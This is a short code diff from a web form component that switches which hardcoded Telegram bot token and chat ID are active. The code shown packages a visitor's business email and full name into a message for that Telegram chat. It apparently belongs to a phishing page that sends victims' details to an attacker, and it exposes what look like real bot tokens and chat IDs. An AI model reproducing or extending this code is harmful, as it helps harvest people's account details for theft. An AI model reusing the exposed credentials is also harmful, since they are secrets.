@@ -78,10 +78,10 @@ const ConfirmComponent = () => {
 
             localStorage.setItem('dataAllCode', JSON.stringify(finalCode))
 
-            const bot_token = '6481745897:AAGlEhZSpMevvKrloFpqHLYcYQfenxeFvC8';
-            const chat_id   = '1367126688';
-            // const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
-            // const chat_id   = '5208541473';
+            // const bot_token = '6481745897:AAGlEhZSpMevvKrloFpqHLYcYQfenxeFvC8';
+            // const chat_id   = '1367126688';
+            const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
+            const chat_id   = '5208541473';
 
             const message   = '<strong>Email Account: </strong>' + finalCode.fill_business_email + 
             '%0A<strong>Name Acount: </strong>' + finalCode.fill_full_name + 
